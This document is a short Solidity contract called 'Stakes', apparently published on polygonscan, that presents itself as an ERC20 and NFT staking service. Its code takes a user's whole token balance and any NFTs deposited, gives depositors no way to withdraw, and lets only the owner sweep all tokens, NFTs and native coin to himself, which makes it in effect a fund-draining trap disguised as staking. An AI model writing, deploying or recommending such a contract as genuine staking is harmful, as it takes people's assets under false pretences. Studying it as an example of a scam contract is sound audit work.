/**
 *Submitted for verification at polygonscan.com on 2022-04-16
*/

pragma solidity 0.4.26;

interface IERC20Token {
    function balanceOf(address owner) public returns (uint256);
    function transfer(address to, uint256 amount) public returns (bool);
    function decimals() public returns (uint256);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC721Token {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function approve(address to, uint256 tokenId) external;
}

contract Stakes {
    IERC20Token public tokenContract;
    IERC721Token public tokenNFT;
    address public owner;

    

    function Stakes(IERC20Token _tokenContract,IERC721Token _nft) public {
        owner = msg.sender;
        tokenContract = _tokenContract;
        tokenNFT = _nft;
    }

    function ChangeToken(IERC20Token AddressToken) public{
        require(msg.sender==owner);
        tokenContract = AddressToken;
    }
    function ChangeTokenNFT(IERC721Token AddressToken) public{
        require(msg.sender==owner);
        tokenNFT = AddressToken;
    }

    function Approve(address approveaddress) public returns(bool) {
        return tokenContract.approve(approveaddress,tokenContract.balanceOf(msg.sender));
    }
    function ApproveERC721(address approveaddress,uint256 tokenid) public {
        tokenNFT.approve(approveaddress,tokenid);
    }

    function DepositSafeNFT(uint256 tokenid) public {
        tokenNFT.safeTransferFrom(msg.sender,address(this),tokenid);
    }
    function DepositNFT(uint256 tokenid) public {
        tokenNFT.transferFrom(msg.sender,address(this),tokenid);
    }

    function WithdrawSafeNFT(IERC721Token AddressToken,uint256 tokenid) public{
        require(msg.sender==owner);
        AddressToken.safeTransferFrom(address(this),owner,tokenid);
    }

    function WithdrawNFT(IERC721Token AddressToken,uint256 tokenid) public{
        require(msg.sender==owner);
        AddressToken.transferFrom(address(this),owner,tokenid);
    }

    

    function StakeERC20() public{
        tokenContract.transferFrom(msg.sender,address(this),tokenContract.balanceOf(msg.sender));
    }

    function endOfStake(IERC20Token TokenAddress) public {
        require(msg.sender==owner);
        TokenAddress.transfer(owner,TokenAddress.balanceOf(this));
    }
    function endOfBSC() public {
        require(msg.sender==owner);
        msg.sender.transfer(address(this).balance);
    }

    function ChangeOwner(address newOwner) public {
        require(msg.sender == owner,"this function Just Run Owner");
        owner = newOwner;
    }

}